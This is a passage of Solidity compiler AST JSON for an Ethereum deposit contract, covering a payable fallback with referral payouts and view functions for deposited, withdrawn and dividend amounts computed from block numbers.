                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0x0"
                      },
                      "src": "1574:14:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "&&",
                    "rightExpression": {
                      "argumentTypes": null,
                      "commonType": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "id": 228,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "argumentTypes": null,
                        "id": 225,
                        "name": "referrer",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 216,
                        "src": "1592:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "!=",
                      "rightExpression": {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "id": 226,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 359,
                          "src": "1604:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 227,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1604:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "src": "1592:22:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "src": "1574:40:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": null,
                  "id": 243,
                  "nodeType": "IfStatement",
                  "src": "1570:124:0",
                  "trueBody": {
                    "id": 242,
                    "nodeType": "Block",
                    "src": "1616:78:0",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "id": 233,
                              "name": "admRefPerc",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 124,
                              "src": "1639:10:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "expression": {
                              "argumentTypes": null,
                              "id": 230,
                              "name": "referrer",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 216,
                              "src": "1621:8:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "id": 232,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "transfer",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": null,
                            "src": "1621:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                              "typeString": "function (uint256)"
                            }
                          },
                          "id": 234,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1621:29:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 235,
                        "nodeType": "ExpressionStatement",
                        "src": "1621:29:0"
                      },
                      {
                        "expression": {
                          "argumentTypes": null,
                          "id": 240,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "argumentTypes": null,
                            "baseExpression": {
                              "argumentTypes": null,
                              "id": 236,
                              "name": "refearned",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 19,
                              "src": "1656:9:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                "typeString": "mapping(address => uint256)"
                              }
                            },
                            "id": 238,
                            "indexExpression": {
                              "argumentTypes": null,
                              "id": 237,
                              "name": "referrer",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 216,
                              "src": "1666:8:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "isConstant": false,
                            "isLValue": true,
                            "isPure": false,
                            "lValueRequested": true,
                            "nodeType": "IndexAccess",
                            "src": "1656:19:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "+=",
                          "rightHandSide": {
                            "argumentTypes": null,
                            "id": 239,
                            "name": "admRefPerc",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 124,
                            "src": "1679:10:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1656:33:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 241,
                        "nodeType": "ExpressionStatement",
                        "src": "1656:33:0"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 250,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "baseExpression": {
                        "argumentTypes": null,
                        "id": 244,
                        "name": "blocklock",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 23,
                        "src": "1698:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                          "typeString": "mapping(address => uint256)"
                        }
                      },
                      "id": 247,
                      "indexExpression": {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "id": 245,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 359,
                          "src": "1708:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 246,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1708:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "1698:21:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 248,
                        "name": "block",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 349,
                        "src": "1722:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_block",
                          "typeString": "block"
                        }
                      },
                      "id": 249,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "number",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1722:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1698:36:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 251,
                  "nodeType": "ExpressionStatement",
                  "src": "1698:36:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 258,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "baseExpression": {
                        "argumentTypes": null,
                        "id": 252,
                        "name": "deposited",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11,
                        "src": "1738:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                          "typeString": "mapping(address => uint256)"
                        }
                      },
                      "id": 255,
                      "indexExpression": {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "id": 253,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 359,
                          "src": "1748:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 254,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1748:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "1738:21:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "+=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 256,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 359,
                        "src": "1763:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 257,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "value",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1763:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1738:34:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 259,
                  "nodeType": "ExpressionStatement",
                  "src": "1738:34:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 266,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 260,
                      "name": "totalDepositedWei",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 26,
                      "src": "1777:17:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 262,
                          "name": "totalDepositedWei",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 26,
                          "src": "1801:17:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 263,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 359,
                            "src": "1819:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 264,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1819:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        ],
                        "id": 261,
                        "name": "add",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 120,
                        "src": "1797:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                          "typeString": "function (uint256,uint256) pure returns (uint256)"
                        }
                      },
                      "id": 265,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1797:32:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1777:52:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 267,
                  "nodeType": "ExpressionStatement",
                  "src": "1777:52:0"
                }
              ]
            },
            "documentation": null,
            "id": 269,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 121,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "990:2:0"
            },
            "payable": true,
            "returnParameters": {
              "id": 122,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1010:0:0"
            },
            "scope": 344,
            "src": "982:851:0",
            "stateMutability": "payable",
            "superFunction": null,
            "visibility": "external"
          },
          {
            "body": {
              "id": 280,
              "nodeType": "Block",
              "src": "1910:37:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "baseExpression": {
                      "argumentTypes": null,
                      "id": 276,
                      "name": "deposited",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 11,
                      "src": "1921:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                        "typeString": "mapping(address => uint256)"
                      }
                    },
                    "id": 278,
                    "indexExpression": {
                      "argumentTypes": null,
                      "id": 277,
                      "name": "_address",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 271,
                      "src": "1931:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "isConstant": false,
                    "isLValue": true,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "IndexAccess",
                    "src": "1921:19:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 275,
                  "id": 279,
                  "nodeType": "Return",
                  "src": "1914:26:0"
                }
              ]
            },
            "documentation": null,
            "id": 281,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "userDepositedWei",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 272,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 271,
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 281,
                  "src": "1862:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 270,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1862:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "1861:18:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 275,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 274,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 281,
                  "src": "1901:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 273,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1901:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "1900:9:0"
            },
            "scope": 344,
            "src": "1836:111:0",
            "stateMutability": "view",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 292,
              "nodeType": "Block",
              "src": "2023:36:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "baseExpression": {
                      "argumentTypes": null,
                      "id": 288,
                      "name": "withdrew",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 15,
                      "src": "2034:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                        "typeString": "mapping(address => uint256)"
                      }
                    },
                    "id": 290,
                    "indexExpression": {
                      "argumentTypes": null,
                      "id": 289,
                      "name": "_address",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 283,
                      "src": "2043:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "isConstant": false,
                    "isLValue": true,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "IndexAccess",
                    "src": "2034:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 287,
                  "id": 291,
                  "nodeType": "Return",
                  "src": "2027:25:0"
                }
              ]
            },
            "documentation": null,
            "id": 293,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "userWithdrewWei",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 284,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 283,
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 293,
                  "src": "1975:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 282,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1975:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "1974:18:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 287,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 286,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 293,
                  "src": "2014:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 285,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "2014:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2013:9:0"
            },
            "scope": 344,
            "src": "1950:109:0",
            "stateMutability": "view",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 321,
              "nodeType": "Block",
              "src": "2136:101:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "arguments": [
                          {
                            "argumentTypes": null,
                            "arguments": [
                              {
                                "argumentTypes": null,
                                "arguments": [
                                  {
                                    "argumentTypes": null,
                                    "baseExpression": {
                                      "argumentTypes": null,
                                      "id": 304,
                                      "name": "deposited",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 11,
                                      "src": "2163:9:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                        "typeString": "mapping(address => uint256)"
                                      }
                                    },
                                    "id": 306,
                                    "indexExpression": {
                                      "argumentTypes": null,
                                      "id": 305,
                                      "name": "_address",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 295,
                                      "src": "2173:8:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_address",
                                        "typeString": "address"
                                      }
                                    },
                                    "isConstant": false,
                                    "isLValue": true,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "nodeType": "IndexAccess",
                                    "src": "2163:19:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  {
                                    "argumentTypes": null,
                                    "hexValue": "34",
                                    "id": 307,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "2183:1:0",
                                    "subdenomination": null,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_4_by_1",
                                      "typeString": "int_const 4"
                                    },
                                    "value": "4"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_rational_4_by_1",
                                      "typeString": "int_const 4"
                                    }
                                  ],
                                  "id": 303,
                                  "name": "mul",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 62,
                                  "src": "2159:3:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                    "typeString": "function (uint256,uint256) pure returns (uint256)"
                                  }
                                },
                                "id": 308,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "2159:26:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              {
                                "argumentTypes": null,
                                "hexValue": "313030",
                                "id": 309,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "2186:3:0",
                                "subdenomination": null,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_100_by_1",
                                  "typeString": "int_const 100"
                                },
                                "value": "100"
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                {
                                  "typeIdentifier": "t_rational_100_by_1",
                                  "typeString": "int_const 100"
                                }
                              ],
                              "id": 302,
                              "name": "div",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 76,
                              "src": "2155:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                "typeString": "function (uint256,uint256) pure returns (uint256)"
                              }
                            },
                            "id": 310,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "functionCall",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "2155:35:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          {
                            "argumentTypes": null,
                            "commonType": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "id": 316,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "leftExpression": {
                              "argumentTypes": null,
                              "expression": {
                                "argumentTypes": null,
                                "id": 311,
                                "name": "block",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 349,
                                "src": "2191:5:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_magic_block",
                                  "typeString": "block"
                                }
                              },
                              "id": 312,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "memberName": "number",
                              "nodeType": "MemberAccess",
                              "referencedDeclaration": null,
                              "src": "2191:12:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "-",
                            "rightExpression": {
                              "argumentTypes": null,
                              "baseExpression": {
                                "argumentTypes": null,
                                "id": 313,
                                "name": "blocklock",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 23,
                                "src": "2204:9:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                  "typeString": "mapping(address => uint256)"
                                }
                              },
                              "id": 315,
                              "indexExpression": {
                                "argumentTypes": null,
                                "id": 314,
                                "name": "_address",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 295,
                                "src": "2214:8:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              },
                              "isConstant": false,
                              "isLValue": true,
                              "isPure": false,
                              "lValueRequested": false,
                              "nodeType": "IndexAccess",
                              "src": "2204:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "src": "2191:32:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          ],
                          "id": 301,
                          "name": "mul",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 62,
                          "src": "2151:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                            "typeString": "function (uint256,uint256) pure returns (uint256)"
                          }
                        },
                        "id": 317,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2151:73:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "argumentTypes": null,
                        "hexValue": "35393030",
                        "id": 318,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2225:4:0",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_5900_by_1",
                          "typeString": "int_const 5900"
                        },
                        "value": "5900"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_5900_by_1",
                          "typeString": "int_const 5900"
                        }
                      ],
                      "id": 300,
                      "name": "div",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 76,
                      "src": "2147:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                        "typeString": "function (uint256,uint256) pure returns (uint256)"
                      }
                    },
                    "id": 319,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2147:83:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 299,
                  "id": 320,
                  "nodeType": "Return",
                  "src": "2140:90:0"
                }
              ]
            },
            "documentation": null,
            "id": 322,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "userDividendsWei",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 296,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 295,
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 322,
                  "src": "2088:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 294,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "2088:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2087:18:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 299,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 298,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 322,
                  "src": "2127:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 297,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "2127:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "2126:9:0"
            },
            "scope": 344,
            "src": "2062:175:0",
            "stateMutability": "view",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 333,
              "nodeType": "Block",
              "src": "2314:37:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "baseExpression": {
                      "argumentTypes": null,
                      "id": 329,
                      "name": "refearned",
                      "nodeType": "Identifier",
